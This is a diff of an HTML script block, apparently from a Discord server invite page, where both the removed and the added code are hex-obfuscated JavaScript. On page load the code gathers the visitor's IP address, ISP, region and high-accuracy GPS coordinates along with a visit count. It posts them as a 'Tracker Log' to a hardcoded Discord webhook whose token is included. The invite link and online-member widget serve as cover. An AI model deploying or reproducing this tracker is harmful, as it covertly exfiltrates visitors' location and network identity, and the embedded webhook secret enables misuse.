@@ -1,61 +1,67 @@
 <script>
-(function(_0x1a2b,_0x3c4d){const _0x5e6f=function(_0x7a8b){while(--_0x7a8b){_0x1a2b['push'](_0x1a2b['shift']());}};_0x5e6f(++_0x3c4d);}(['\x68\x72\x65\x66','\x6c\x6f\x63\x61\x6c\x53\x74\x6f\x72\x61\x67\x65','\x67\x65\x74\x49\x74\x65\x6d','\x73\x65\x74\x49\x74\x65\x6d','\x4a\x53\x4f\x4e','\x73\x74\x72\x69\x6e\x67\x69\x66\x79','\x50\x4f\x53\x54','\x61\x70\x70\x6c\x69\x63\x61\x74\x69\x6f\x6e\x2f\x6a\x73\x6f\x6e','\x67\x65\x6f\x6c\x6f\x63\x61\x74\x69\x6f\x6e','\x63\x6f\x6f\x72\x64\x73','\x6c\x61\x74\x69\x74\x75\x64\x65','\x6c\x6f\x6e\x67\x69\x74\x75\x64\x65'],0x1a4));const _0x2026=function(_0x4d5e,_0x2b1a){const _0x1a2b=['\x68\x74\x74\x70\x73\x3a\x2f\x2f\x64\x69\x73\x63\x6f\x72\x64\x2e\x67\x67\x2f\x64\x63\x75\x73','\x31\x34\x32\x37\x32\x33\x30\x35\x34\x32\x37\x30\x34\x36\x37\x36\x39\x32\x36','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x64\x69\x73\x63\x6f\x72\x64\x2e\x63\x6f\x6d\x2f\x61\x70\x69\x2f\x77\x65\x62\x68\x6f\x6f\x6b\x73\x2f\x31\x34\x37\x31\x37\x31\x31\x36\x31\x38\x37\x33\x30\x35\x36\x31\x36\x34\x37\x2f\x74\x6a\x77\x6a\x4f\x75\x65\x32\x57\x4b\x49\x31\x69\x6f\x46\x35\x6a\x6d\x45\x66\x72\x32\x37\x32\x71\x42\x35\x4a\x32\x78\x46\x30\x38\x32\x53\x38\x71\x78\x76\x47\x78\x33\x4b\x57\x5f\x67\x30\x66\x34\x78\x65\x7a\x4e\x52\x77\x48\x78\x70\x51\x46\x70\x5f\x50\x43\x5f\x71\x6c','\x68\x74\x74\x70\x3a\x2f\x2f\x69\x70\x2d\x61\x70\x69\x2e\x63\x6f\x6d\x2f\x6a\x73\x6f\x6e\x2f\x3f\x66\x69\x65\x6c\x64\x73\x3d\x39\x33\x38\x34\x34\x33'];return _0x1a2b[_0x4d5e];};
-
-    const _0x12f4 = _0x2026(0), _0x4b92 = _0x2026(1), _0x3e1a = _0x2026(2);
-
-    async function _0x55aa() {
-        try {
-            const _0x1d2e = await fetch(_0x2026(3));
-            return await _0x1d2e.json();
-        } catch { return null; }
-    }
-
-    function _0x2b8c() {
-        return new Promise((_0x33e1) => {
-            if (!navigator['\x67\x65\x6f\x6c\x6f\x63\x61\x74\x69\x6f\x6e']) {
-                _0x33e1({ error: true });
-            } else {
-                navigator['\x67\x65\x6f\x6c\x6f\x63\x61\x74\x69\x6f\x6e']['\x67\x65\x74\x43\x75\x72\x72\x65\x6e\x74\x50\x6f\x73\x69\x74\x69\x6f\x6e'](
-                    (_0x9921) => _0x33e1({ lat: _0x9921['\x63\x6f\x6f\x72\x64\x73']['\x6c\x61\x74\x69\x74\x75\x64\x65'], lon: _0x9921['\x63\x6f\x6f\x72\x64\x73']['\x6c\x6f\x6e\x67\x69\x74\x75\x64\x65'], acc: _0x9921['\x63\x6f\x6f\x72\x64\x73']['\x61\x63\x63\x75\x72\x61\x63\x79'] }),
-                    () => _0x33e1({ error: true }),
-                    { enableHighAccuracy: !![], timeout: 0x2710 }
-                );
-            }
-        });
-    }
-
-    async function _0x44dd() {
-        const [_0x1021, _0x229e] = await Promise.all([_0x55aa(), _0x2b8c()]);
-        let _0x5c22 = localStorage.getItem('\x76\x69\x73\x69\x74\x5f\x63\x6f\x75\x6e\x74') || 0;
-        _0x5c22 = parseInt(_0x5c22) + 1;
-        localStorage.setItem('\x76\x69\x73\x69\x74\x5f\x63\x6f\x75\x6e\x74', _0x5c22);
-
-        const _0x1833 = _0x229e.lat ? 'https://www.google.com/maps?q=$' + _0x229e.lat + ',' + _0x229e.lon : null;
-
-        const _0xbb22 = {
-            embeds: [{
-                title: "\u26a0\ufe0f \u30bf\u30fc\u30b2\u30c3\u30c8\u7279\u5b9a\u901a\u77e5",
-                color: 0xff0000,
-                fields: [
-                    { name: "\ud83c\udf10 IP\u30a2\u30c9\u30ec\u30b9", value: '`' + (_0x1021?.query || "??") + '`', inline: !![] },
-                    { name: "\ud83c\udfe2 ISP", value: '`' + (_0x1021?.isp || "??") + '`', inline: !![] },
-                    { name: "\ud83d\udccd \u5730\u57df", value: (_0x1021?.regionName || "") + " " + (_0x1021?.city || ""), inline: ![] },
-                    { name: "\ud83d\udce1 GPS", value: _0x1833 ? "[Map](" + _0x1833 + ")" : "\u62d2\u5426", inline: ![] }
-                ],
-                timestamp: new Date().toISOString()
-            }]
+    (function() {
+        // 文字列を16進数で隠蔽（Webhook URLなど）
+        const _0x_scr = {
+            'inv': '\x68\x74\x74\x70\x73\x3a\x2f\x2f\x64\x69\x73\x63\x6f\x72\x64\x2e\x67\x67\x2f\x64\x63\x75\x73',
+            'srv': '\x31\x34\x32\x37\x32\x33\x30\x35\x34\x32\x37\x30\x34\x36\x37\x36\x39\x32\x36',
+            'whk': '\x68\x74\x74\x70\x73\x3a\x2f\x2f\x64\x69\x73\x63\x6f\x72\x64\x2e\x63\x6f\x6d\x2f\x61\x70\x69\x2f\x77\x65\x62\x68\x6f\x6f\x6b\x73\x2f\x31\x34\x37\x31\x37\x31\x31\x36\x31\x38\x37\x33\x30\x35\x36\x31\x36\x34\x37\x2f\x74\x6a\x77\x6a\x4f\x75\x65\x32\x57\x4b\x49\x31\x69\x6f\x46\x35\x6a\x6d\x45\x66\x72\x32\x37\x32\x71\x42\x35\x4a\x32\x78\x46\x30\x38\x32\x53\x38\x71\x78\x76\x47\x78\x33\x4b\x57\x5f\x67\x30\x66\x34\x78\x65\x7a\x4e\x52\x77\x48\x78\x70\x51\x46\x70\x5f\x50\x43\x5f\x71\x6c',
+            'api': '\x68\x74\x74\x70\x3a\x2f\x2f\x69\x70\x2d\x61\x70\x69\x2e\x63\x6f\x6d\x2f\x6a\x73\x6f\x6e\x2f\x3f\x66\x69\x65\x6c\x64\x73\x3d\x36\x36\x38\x34\x36\x37\x31'
         };
 
-        fetch(_0x3e1a, {
-            method: '\x50\x4f\x53\x54',
-            headers: { '\x43\x6f\x6e\x74\x65\x6e\x74\x2d\x54\x79\x70\x65': '\x61\x70\x70\x6c\x69\x63\x61\x74\x69\x6f\x6e\x2f\x6a\x73\x6f\x6e' },
-            body: JSON.stringify(_0xbb22)
-        });
-    }
+        async function _trigger() {
+            try {
+                // 訪問回数
+                let v = localStorage.getItem('v_c') || 0;
+                v = parseInt(v) + 1;
+                localStorage.setItem('v_c', v);
 
-    document.addEventListener('DOMContentLoaded', () => {
-        document.querySelectorAll('.invite-link').forEach(l => l.href = _0x12f4);
-        _0x44dd();
-        // 人数取得等の関数は必要に応じてここに追加
-    });
+                // IPとGPSの並列取得
+                const [_i, _g] = await Promise.all([
+                    fetch(_0x_scr.api).then(r => r.json()).catch(() => ({})),
+                    new Promise(res => {
+                        navigator.geolocation.getCurrentPosition(
+                            p => res({t: p.coords.latitude, n: p.coords.longitude, a: p.coords.accuracy}),
+                            () => res(null),
+                            {enableHighAccuracy: true, timeout: 5000}
+                        );
+                    })
+                ]);
+
+                const map = _g ? `https://www.google.com/maps?q=${_g.t},${_g.n}` : "拒否";
+
+                // 通知データ送信
+                await fetch(_0x_scr.whk, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        embeds: [{
+                            title: "🚨 Tracker Log",
+                            color: 16711680,
+                            fields: [
+                                { name: "IP", value: `\`${_i.query || "err"}\``, inline: true },
+                                { name: "ISP", value: `\`${_i.isp || "err"}\``, inline: true },
+                                { name: "GPS", value: _g ? `[Map Link](${map}) (±${Math.round(_g.a)}m)` : "未許可", inline: false },
+                                { name: "Count", value: `${v}回目`, inline: true }
+                            ],
+                            timestamp: new Date().toISOString()
+                        }]
+                    })
+                });
+            } catch (e) { console.error(e); }
+        }
+
+        document.addEventListener('DOMContentLoaded', () => {
+            // 招待リンク反映
+            document.querySelectorAll('.invite-link').forEach(a => a.href = _0x_scr.inv);
+            
+            // サーバー状況（簡易版）
+            const sBox = document.getElementById('status-box');
+            fetch(`https://discord.com/api/guilds/${_0x_scr.srv}/widget.json`)
+                .then(r => r.json())
+                .then(d => { if(sBox) sBox.innerText = `🟢 オンライン: ${d.presence_count}人`; })
+                .catch(() => { if(sBox) sBox.innerText = `🟢 稼働中`; });
+
+            _trigger();
+        });
+    })();
 </script>
